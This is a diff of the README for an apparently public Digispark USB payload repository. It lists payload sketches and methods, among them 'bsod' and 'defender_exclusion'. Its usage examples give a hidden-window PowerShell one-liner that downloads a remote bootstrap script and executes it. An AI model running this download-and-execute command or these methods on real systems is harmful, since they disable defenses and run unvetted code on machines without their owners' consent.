@@ -1,20 +1,29 @@
 # digispark-payloads
 
-A collection of lightweight payload methods for Digispark-based USB automation.
+A collection of lightweight Digispark USB automation payloads and execution methods.
 
 ## Available Projects
 
-| ID | Method             |
-| -: | ------------------ |
-|  1 | `invoke_script`    |
+Projects are `.ino` payload sketches that can be flashed onto the Digispark and may optionally use a method when executed.
+
+| Project             |
+| ------------------- |
+| `invoke_script`     |
+| `keyboard_cps_test` |
+| `mouse_jiggle`      |
+| `rickroll`          |
+| `wallpaper_change`  |
 
 ## Available Methods
 
-| Method               |
-| -------------------- |
-| `bsod`               |
-| `change_wallaper`    |
-| `defender_exclusion` |
+Methods are callable actions that can be executed directly via the bootstrap script using a method ID, or embedded into a Digispark sketch such as `projects/invoke_script/basic_parameter.ino`.
+
+| ID | Method               |
+| -: | -------------------- |
+|  3 | `bsod`               |
+|  2 | `defender_exclusion` |
+|  1 | `notepad_message`    |
+|  0 | `wallpaper_change`   |
 
 ## Usage
 
@@ -26,10 +35,10 @@ powershell -W H -c "& ([ScriptBlock]::Create((irm 'https://raw.githubusercontent
 
 ### Example
 
-Change the wallpaper using method `1`:
+Change the wallpaper using method `0` (default):
 
 ```cmd
-powershell -W H -c "& ([ScriptBlock]::Create((irm 'https://raw.githubusercontent.com/phoenixthrush/digispark-payloads/refs/heads/main/bootstrap.ps1'))) 1"
+powershell -W H -c "& ([ScriptBlock]::Create((irm 'https://raw.githubusercontent.com/phoenixthrush/digispark-payloads/refs/heads/main/bootstrap.ps1')))"
 ```
 
 ## How It Works
@@ -53,3 +62,7 @@ powershell -W H -c "& ([ScriptBlock]::Create((irm 'https://raw.githubusercontent
 ## Disclaimer
 
 This repository is intended for educational and research purposes only. Ensure you have authorization before running payloads on any system.
+
+## License
+
+This project uses the MIT License. See the [LICENSE](LICENSE) file for details.
